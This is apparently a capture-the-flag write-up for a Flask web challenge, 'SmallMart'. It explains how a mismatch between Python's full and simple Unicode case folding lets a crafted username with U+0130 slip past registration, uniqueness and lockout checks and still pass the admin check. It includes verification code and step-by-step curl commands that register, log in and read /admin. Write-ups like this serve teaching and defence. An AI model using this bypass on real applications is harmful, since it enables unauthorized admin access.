# SmallMart — Broken Access Control via Unicode Case-Folding Mismatch
 
**Category:** Web / Broken Access Control **Target:** SmallMart (Flask + SQLite) **Author:** Ghost\_Shade **Vulnerability class:** CWE-178 (Improper Handling of Case Sensitivity) / Unicode case-folding inconsistency
 
## Summary
 
SmallMart gates admin access behind a single check, `is_admin_username()`, which tests whether the logged-in session user is "admin" using a **case-insensitive regex**. Everywhere else in the app — the registration blocklist, the DB `UNIQUE` constraint, and the login lockout for the real admin account — the username `admin` is compared using either `str.lower()` or an exact literal match.
 
Those comparisons are not equivalent. Python's `str.lower()` performs *full* Unicode case mapping, while `re.IGNORECASE` performs *simple* Unicode case mapping. For most characters the two agree, but for a small set of characters — most famously `U+0130` (`İ`, LATIN CAPITAL LETTER I WITH DOT ABOVE) — they diverge. This lets an attacker register a username that is rejected by none of the app's "is this admin" filters except the one that actually grants access to `/admin`.
 
## Root Cause
 
```python
def is_admin_username(name: str) -> bool:
    return bool(re.match(r"^admin$", name or "", flags=re.IGNORECASE))
```
 
vs.
 
```python
# register()
if username.lower() == "admin":
    flash("This username is reserved.", "error")
    return redirect(url_for("register"))
```
 
vs.
 
```python
# login()
if row["username"] == ADMIN_USERNAME:   # exact literal compare
    flash("This account is locked. Contact staff.", "error")
    return redirect(url_for("login"))
```
 
Three different notions of "is this the admin username", three different answers for the same crafted string.
 
## The Core Bug: Full vs. Simple Unicode Case Folding
 
Python exposes two separate case-folding code paths, and they are not guaranteed to agree:
 
| Mechanism | Folding type | Behavior on `İ` (U+0130) |
| --- | --- | --- |
| `str.lower()` | **Full** Unicode case mapping (`SpecialCasing.txt`) | `İ` → `i` + combining dot above `̇` (U+0307) — **2 codepoints** |
| `re.IGNORECASE` | **Simple** Unicode case mapping (`UnicodeData.txt` simple lowercase field) | `İ` → `i` (U+0069) — **1 codepoint** |
 
Because `str.lower()` expands `İ` into two codepoints, any string containing it gets *longer* when lowercased. A username like `adm` + `İ` + `n` (5 codepoints going in) becomes a 6-codepoint string under `.lower()` — which can never equal the literal 5-character string `"admin"`.
 
But `re.IGNORECASE` folds `İ` down to a single plain `i`, so under the regex engine, `adm` + `İ` + `n` folds to exactly `"admin"` and matches `^admin$`.
 
### Local verification (no target contact required)
 
```python
import re
 
u = "adm\u0130n"                                       # adm + İ + n
 
print(u.lower())                                       # 'admi̇n' (6 codepoints)
print(u.lower() == "admin")                            # False -> bypasses register() filter
print(bool(re.match(r"^admin$", u, re.IGNORECASE)))    # True  -> passes is_admin_username()
print(u == "admin")                                    # False -> bypasses login() lockout
```
 
All three results are deterministic CPython/Unicode table behavior — not a race condition, not version-dependent within CPython 3.x, and reproducible offline before touching the live target.
 
## Exploitation
 
**Step 1 — Register with the lookalike username.** `İ` is `C4 B0` in UTF-8.
 
```bash
curl -c cj.txt -X POST http://TARGET/register \
  --data-urlencode $'username=adm\xc4\xb0n' \
  --data-urlencode "password=Passw0rd!"
```
 
This passes `register()`'s reserved-name check (`username.lower() == "admin"` is `False`) and the DB `UNIQUE` constraint (the stored string differs byte-for-byte from the real `"admin"` row), so the account is created successfully.
 
**Step 2 — Log in as that exact username.**
 
```bash
curl -b cj.txt -c cj.txt -X POST http://TARGET:5137/login \
  --data-urlencode $'username=adm\xc4\xb0n' \
  --data-urlencode "password=Passw0rd!"
```
 
`login()`'s admin lockout (`row["username"] == ADMIN_USERNAME`) is a literal comparison and does not fire, so `session["user"]` is set to `"adm\u0130n"`.
 
**Step 3 — Hit the admin panel.**
 
```bash
curl -b cj.txt http://TARGET/admin
```
 
`is_admin_username("adm\u0130n")` evaluates `re.match(r"^admin$", ..., re.IGNORECASE)`, which matches under simple case folding. The flag is returned.
 
## Guard-by-Guard Breakdown
 
| Guard | Comparison used | Result for `adm` + `İ` + `n` | Outcome |
| --- | --- | --- | --- |
| `register()` reserved-name filter | `username.lower() == "admin"` (full folding) | `False` | Registration allowed |
| `users.username` UNIQUE constraint | exact byte match | No collision | Insert succeeds |
| `login()` admin lockout | `row["username"] == "admin"` (literal) | `False` | Login allowed |
| `/admin` access gate | `re.match(..., re.IGNORECASE)` (simple folding) | `True` | **Flag disclosed** |
 
Every defensive check the developers added uses a *stricter* or *differently-folding* comparison than the one actual authorization check, so the "look like admin" string slips past all of them and only matches where it matters.
 